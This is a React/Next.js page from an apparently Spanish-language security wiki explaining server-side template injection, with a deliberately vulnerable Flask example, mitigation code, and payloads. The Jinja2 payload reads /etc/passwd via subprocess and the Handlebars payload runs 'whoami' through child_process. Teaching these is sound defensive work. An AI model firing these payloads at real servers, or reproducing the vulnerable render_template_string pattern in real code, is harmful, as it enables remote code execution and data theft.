'use client';

import Link from 'next/link';
import { useParams } from 'next/navigation';
import { Home, AlertTriangle, FileText } from 'lucide-react';

export default function SSTIPage() {
  const params = useParams();
  const locale = params.locale as string;

  return (
    <div className="min-h-screen">
      <div className="bg-white dark:bg-slate-900/50 border-b border-slate-200 dark:border-slate-700 px-8 py-4">
        <div className="max-w-5xl mx-auto flex items-center gap-2 text-sm">
          <Link href={`/${locale}/wiki`} className="text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:text-white transition-colors flex items-center gap-1">
            <Home className="w-4 h-4" />Wiki</Link>
          <span className="text-slate-600">/</span>
          <Link href={`/${locale}/wiki`} className="text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:text-white transition-colors">Vulnerabilidades</Link>
          <span className="text-slate-600">/</span>
          <span className="text-white dark:text-white">SSTI</span>
        </div>
      </div>

      <div className="bg-gradient-to-r from-purple-600 via-pink-600 to-red-600 px-8 py-12">
        <div className="max-w-5xl mx-auto">
          <div className="flex items-center gap-3 mb-4">
            <div className="px-3 py-1 bg-red-500/20 text-red-700 dark:text-red-300 rounded-lg text-sm font-medium border border-red-500/30">Avanzado</div>
            <div className="px-3 py-1 bg-red-500/30 text-red-200 rounded-lg text-sm font-medium border border-red-400/40">CVSS 8.8 - Alto</div>
            <div className="px-3 py-1 bg-white/10 backdrop-blur-sm text-slate-900 dark:text-white rounded-lg text-sm">24 min</div>
          </div>
          <h1 className="text-4xl md:text-5xl font-bold text-slate-900 dark:text-white mb-4 flex items-center gap-4">
            <FileText className="w-12 h-12" />Server-Side Template Injection</h1>
          <p className="text-xl text-pink-100">Inyección de código en motores de plantillas del servidor</p>
        </div>
      </div>

      <div className="max-w-5xl mx-auto px-8 py-12">
        <div className="prose prose-invert prose-lg max-w-none">
          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">¿Qué es SSTI?</h2>
            <p className="text-slate-700 dark:text-slate-300 mb-6">
              SSTI ocurre cuando input del usuario se inserta en plantillas del lado del servidor (Jinja2, Handlebars, etc) 
              permitiendo ejecución de código arbitrario.
            </p>
            
            <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-6 mb-6">
              <h3 className="text-xl font-semibold text-red-600 dark:text-red-400 mb-3">Ejemplo Vulnerable (Jinja2)</h3>
              <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                <pre className="text-red-600 dark:text-red-400">
{`# Python/Flask - VULNERABLE
from flask import Flask, request, render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # ❌ PELIGROSO: renderizar input del usuario directamente
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)

# Ataque:
# /hello?name={{7*7}}  → devuelve 49 (confirma SSTI)
# /hello?name={{config}}  → leak configuración
# /hello?name={{''.__class__.__mro__[1].__subclasses__()}}  → RCE`}
                </pre>
              </div>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Payloads por Motor</h2>
            <div className="space-y-4">
              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-3">Jinja2 (Python)</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-red-600 dark:text-red-400">
{`{{7*7}}
{{config}}
{{self.__init__.__globals__}}
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}`}
                  </pre>
                </div>
              </div>

              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-3">Handlebars (Node.js)</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-red-600 dark:text-red-400">
{`{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}`}
                  </pre>
                </div>
              </div>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Mitigación</h2>
            <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-6">
              <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                <pre className="text-green-600 dark:text-green-400">
{`// ✅ NUNCA renderizar input del usuario como plantilla
// Mal:
return render_template_string(f"<h1>Hello {name}!</h1>")

// Bien: usar contexto
return render_template('hello.html', name=name)

<!-- hello.html -->
<h1>Hello {{ name }}!</h1>  <!-- Jinja2 escapa automáticamente -->

// ✅ Sanitizar si es necesario
from markupsafe import escape
safe_name = escape(name)

// ✅ Usar sandboxing
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()`}
                </pre>
              </div>
            </div>
          </section>

          <div className="bg-gradient-to-r from-purple-600/20 to-red-600/20 border border-purple-500/30 rounded-xl p-8 text-center">
            <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente</h3>
            <Link href={`/${locale}/wiki/vulnerabilidades/broken-authentication`}
              className="inline-flex items-center gap-2 px-6 py-3 bg-purple-600 hover:bg-purple-700 text-slate-900 dark:text-white rounded-xl font-semibold transition-all">
              Broken Authentication<span>→</span></Link>
          </div>
        </div>
      </div>
    </div>
  );
}
